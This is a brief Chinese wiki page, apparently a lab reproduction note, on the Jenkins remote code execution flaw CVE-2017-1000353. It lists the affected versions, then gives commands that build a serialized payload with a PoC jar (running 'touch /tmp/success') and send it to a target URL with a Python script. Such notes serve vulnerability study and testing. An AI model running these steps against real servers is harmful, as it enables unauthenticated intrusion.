---
title: Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）
description: 
published: true
date: 2025-07-05T00:34:09.530Z
tags: 
editor: markdown
dateCreated: 2025-07-05T00:34:09.530Z
---

# 漏洞概述
攻击者使用该漏洞可以在被攻击服务器执行任意代码，漏洞利用不需要任何的权限
# 影响范围
Jenkins <=2.56
Jenkins LTS <= 2.46.1


# 漏洞利用
1、下载CVE-2017-1000353-1.1-SNAPSHOT-all.jar，这是生成POC的工具
执行下面命令，生成字节码文件
```
java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser "touch /tmp/success"

# jenkins_poc.ser是生成的字节码文件名
# "touch ..."是待执行的任意命令
```

2、将刚才生成的字节码文件发送给目标
```python
python CVE-2017-1000353.py http://your-ip:8080 jenkins_poc.ser

```